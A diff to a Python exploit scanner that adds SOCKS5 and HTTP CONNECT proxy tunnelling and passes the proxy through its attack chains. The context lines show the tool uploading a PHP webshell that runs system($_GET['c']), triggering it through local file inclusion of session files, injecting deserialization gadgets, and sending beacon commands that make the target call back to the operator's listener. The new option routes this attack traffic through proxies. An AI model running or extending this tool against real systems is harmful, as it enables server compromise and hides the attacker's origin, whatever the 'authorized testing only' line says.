@@ -55,6 +55,7 @@ Examples:
 For authorized testing only — scan only systems you own or may test.
 """
 import argparse
+import base64
 import concurrent.futures
 import json
 import os
@@ -78,10 +79,76 @@ def say(msg):
 
 
 # ---------------------------------------------------------------- HTTP core
-def send(host, port, method, path, body=b"", headers="", scheme="http",
-         timeout=10.0, verify=False):
+def proxy_tunnel(proxy, host, port, timeout):
+    """Open a transport connection to host:port through `proxy`
+    (http://[user:pass@]h:p via CONNECT, or socks5:// — remote DNS)."""
+    u = urlparse(proxy or "")
+    ptype = (u.scheme or "http").lower()
+    phost, pport = u.hostname, u.port or (1080 if ptype.startswith("socks") else 8080)
+    if not phost:
+        raise OSError("invalid --proxy URL")
+    sock = socket.create_connection((phost, pport), timeout=timeout)
     try:
-        sock = socket.create_connection((host, port), timeout=timeout)
+        if ptype.startswith("socks"):
+            if ptype == "socks4":
+                raise OSError("socks4 not supported (use http:// or socks5://)")
+            u_, p_ = (u.username or "").encode(), (u.password or "").encode()
+            sock.sendall(b"\x05\x01\x02" if u_ else b"\x05\x01\x00")
+            r = sock.recv(2)
+            if len(r) < 2 or r[0] != 5:
+                raise OSError("socks5 greeting failed")
+            if r[1] == 2:
+                sock.sendall(b"\x01" + bytes([len(u_)]) + u_ + bytes([len(p_)]) + p_)
+                r = sock.recv(2)
+                if len(r) < 2 or r[1] != 0:
+                    raise OSError("socks5 auth rejected")
+            elif r[1] != 0:
+                raise OSError("socks5: no acceptable auth method")
+            hb = host.encode()
+            sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb
+                         + port.to_bytes(2, "big"))
+            r = sock.recv(4)
+            if len(r) < 4 or r[1] != 0:
+                raise OSError(f"socks5 connect failed (rep={r[1] if len(r) > 1 else '?'})")
+            atyp = r[3]
+            if atyp == 1:
+                sock.recv(4)
+            elif atyp == 4:
+                sock.recv(16)
+            else:
+                sock.recv(1)
+                sock.recv(sock.recv(1)[0])
+            sock.recv(2)  # bound port
+        else:
+            req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+            if u.username:
+                tok = base64.b64encode(f"{u.username}:{u.password or ''}".encode()).decode()
+                req += f"Proxy-Authorization: Basic {tok}\r\n"
+            req += "\r\n"
+            sock.sendall(req.encode())
+            resp = b""
+            while b"\r\n\r\n" not in resp:
+                d = sock.recv(4096)
+                if not d:
+                    raise OSError("proxy closed during CONNECT")
+                resp += d
+            parts = resp.split(b" ", 2)
+            if len(parts) < 2 or parts[1] != b"200":
+                raise OSError("proxy CONNECT failed: "
+                              f"{resp.splitlines()[0].decode('latin-1', 'replace')[:80]}")
+        return sock
+    except (OSError, IndexError):
+        sock.close()
+        raise
+
+
+def send(host, port, method, path, body=b"", headers="", scheme="http",
+         timeout=10.0, verify=False, proxy=None):
+    try:
+        if proxy:
+            sock = proxy_tunnel(proxy, host, port, timeout)
+        else:
+            sock = socket.create_connection((host, port), timeout=timeout)
     except OSError:
         return None
     if scheme == "https":
@@ -363,7 +430,7 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
         for cand in WRITE_CANDIDATES:
             sid = "scw" + nonce()
             r = multipart(host, port, cand, sid, "x", "probe.txt",
-                          scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                          scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
             if r is None:
                 continue
             if args.docker and docker_exec(
@@ -384,7 +451,7 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
     mk = f"XUP42-{nonce()}"
     webshell = f"<?php echo 'XUP',(21*2),'-','{mk[6:]}';system($_GET['c']);?>"
     r = multipart(host, port, wp, sid, "x", webshell,
-                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
     if r is None:
         res["detail"].append("webshell injection request failed")
         return res
@@ -406,7 +473,7 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
     lfi = None
     for lp, lp_param in lfi_cands:
         r2 = send(host, port, "GET", f"{lp}?{lp_param}={quote(sess_file)}",
-                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
         if r2 and mk in body_of(r2):
             lfi = (lp, lp_param)
             break
@@ -421,7 +488,7 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
         since = time.time()
         r3 = send(host, port, "GET",
                   f"{lp}?{lp_param}={quote(sess_file)}&c={quote(beacon_cmd(args, my_ip, lport))}",
-                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
         if r3 and "BEACON-OK" in body_of(r3):
             res["blind"] = True
             res["techniques"].append("A1 blind beacon via bare curl (response BEACON-OK)")
@@ -436,7 +503,7 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
             tag = f"Aweb-{nonce(2)}"
             r4 = send(host, port, "GET",
                       f"{lp}?{lp_param}={quote(sess_file)}&c={quote(beacon_cmd(args, my_ip, lport, tag))}",
-                      scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                      scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
             time.sleep(args.settle)
             hit = listener.get_tag(tag) if listener else None
             if hit or (r4 and "BEACON-OK" in body_of(r4)):
@@ -464,13 +531,13 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
                 b_sess = f"{args.save_path}/sess_{b_sid}"
                 if vec == "filename":
                     multipart(host, port, wp, b_sid, "x", php,
-                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
                 else:
                     multipart(host, port, wp, b_sid, php, "probe.txt",
-                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
                 since = time.time()
                 rtrig = send(host, port, "GET", f"{lp}?{lp_param}={quote(b_sess)}",
-                             scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                             scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
                 if rtrig and "BEACON-OK" in body_of(rtrig):
                     hit = True
                 else:
@@ -520,9 +587,9 @@ def chain_c_phase(t, args, my_ip, lport, listener, peers):
     if args.docker:
         docker_exec(args.docker, f"rm -f {args.output_path}")
     r1 = multipart(host, port, cw, sid, gadget_for(f"echo {mk}"), "normal.txt",
-                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
     r2 = multipart(host, port, cr, sid, "x", "normal.txt",
-                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
     proof = ""
     if r2 is not None:
         out = body_of(r2)
@@ -548,10 +615,10 @@ def chain_c_phase(t, args, my_ip, lport, listener, peers):
             cmd = beacon_cmd(args, my_ip, lport, tag)
             b_sid = "scbc" + nonce()
             multipart(host, port, cw, b_sid, gadget_for(cmd), "normal.txt",
-                      scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                      scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
             since = time.time()
             rtrig = multipart(host, port, cr, b_sid, "x", "normal.txt",
-                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
             if rtrig and "BEACON-OK" in body_of(rtrig):
                 hit = True
             else:
@@ -681,6 +748,11 @@ def main():
     ap.add_argument("--timeout", type=float, default=10.0)
     ap.add_argument("--workers", type=int, default=4)
     ap.add_argument("--verify-tls", action="store_true")
+    ap.add_argument("--proxy", default=None,
+                    help="proxy for scanner->target traffic: http://[user:pass@]host:port "
+                         "or socks5:// (CONNECT/SOCKS5, remote DNS). Does NOT affect "
+                         "beacons — the target connects to the listener directly, so "
+                         "--ip must be reachable from the target")
     ap.add_argument("--json", metavar="FILE", help="write full results as JSON")
     ap.add_argument("--log", default="vulnerable.txt",
                     help="append VULNERABLE targets here, deduped across runs; "
